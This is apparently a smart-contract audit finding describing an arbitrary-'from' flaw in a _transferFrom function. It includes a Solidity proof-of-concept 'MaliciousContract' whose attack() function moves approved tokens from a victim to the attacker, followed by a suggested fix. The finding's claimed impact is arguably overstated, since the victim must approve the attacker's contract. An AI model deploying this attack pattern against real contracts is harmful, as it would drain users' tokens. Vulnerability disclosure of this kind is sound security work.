# Vulnerability details

## Impact
Passing an arbitrary `from` address to `transferFrom` (or `safeTransferFrom`) can lead to loss of funds, because anyone can transfer tokens from the `from` address if an approval is made.  

## Proof of Concept
Let's assume we have a scenario where a malicious contract calls the `_transferFrom` function with an arbitrary from address that has approved the transfer of its tokens to the contract. The malicious contract could drain the approved tokens from the from address without the user's direct consent or interaction.

*Proof of Code*
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {TransferAction, PermitParams, ApprovalType} from "./TransferAction.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousContract is TransferAction {
    address public tokenAddress;
    address public owner;

    constructor(address _tokenAddress) {
        tokenAddress = _tokenAddress;
        owner = msg.sender;
    }

    // Function to perform an attack using the vulnerable _transferFrom method
    function attack(address from, uint256 amount) external {
        // Maliciously calling _transferFrom with arbitrary from address
        PermitParams memory params = PermitParams({
            approvalType: ApprovalType.STANDARD,  // or PERMIT, PERMIT2 based on approval mechanism
            approvalAmount: amount,
            nonce: 0,  // Not used for STANDARD approval
            deadline: 0,  // Not used for STANDARD approval
            v: 0,  // Not used for STANDARD approval
            r: bytes32(0),  // Not used for STANDARD approval
            s: bytes32(0)   // Not used for STANDARD approval
        });

        _transferFrom(tokenAddress, from, owner, amount, params);
    }
}
```
Steps to Reproduce:
1. Approve Tokens: The victim (from address) approves the `MaliciousContract` to spend a certain amount of tokens on its behalf.
2. Execute Attack: The `MaliciousContract` calls the attack function, passing the victim's address as the from address and the amount it wishes to steal.
3. Token Transfer: The `_transferFrom` function is executed, which transfers tokens from the victim's address to the attacker's (owner) address.

## Recommended Mitigation Steps
The vulnerability arises because the _transferFrom function allows an arbitrary from address. This means that if there's an existing approval for the contract, anyone could call this function and transfer tokens from any address that has given approval.
To fix this, you should ensure that the from address is always the message sender (msg.sender) or implement a robust authorization mechanism.
